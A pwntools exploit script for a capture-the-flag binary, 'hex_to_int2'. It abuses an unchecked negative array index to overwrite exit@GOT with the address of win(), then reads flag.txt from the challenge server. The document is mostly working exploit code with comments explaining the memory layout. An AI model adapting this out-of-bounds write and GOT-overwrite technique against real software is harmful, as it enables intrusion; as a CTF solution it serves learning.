from pwn import *

# The binary is a hex-to-integer lookup table with an "expand" feature.
#
# Global int32 table at 0x404060. Menu option 2 prompts for:
#   - "hex character" -> used as array index (32-bit int, no bounds check)
#   - "integer value" -> written to table[index]
#
# exit@GOT at 0x404028.
# Distance from table base: 0x404028 - 0x404060 = -0x38 bytes.
# As int32 indices: -0x38 / 4 = -14.
# Entered as unsigned: 0xfffffff2.
#
# win() at 0x4011d4 (decimal 4198868).
# After overwriting exit@GOT, an invalid menu choice triggers exit() -> win().
#
# checksec: Partial RELRO, NX, no canary, no PIE.

def main():
    if args.LOCAL:
        r = process('./hex_to_int2')
    else:
        r = remote('chals.cyberjousting.com', 1365)

    r.recvuntil(b'expand the table (2)?.\n')
    r.sendline(b'2')

    r.recvuntil(b'Enter a hex character to add: ')
    r.sendline(b'fffffff2')

    r.recvuntil(b'What is its integer value?\n')
    r.sendline(b'4198868')

    r.recvuntil(b'expand the table (2)?.\n')
    r.sendline(b'3')

    r.sendline(b'cat flag.txt')

    r.recvuntil(b'Invalid choice.\n')
    flag = r.recvline().strip().decode()
    print(f"\n[+] Flag: {flag}")

if __name__ == '__main__':
    main()
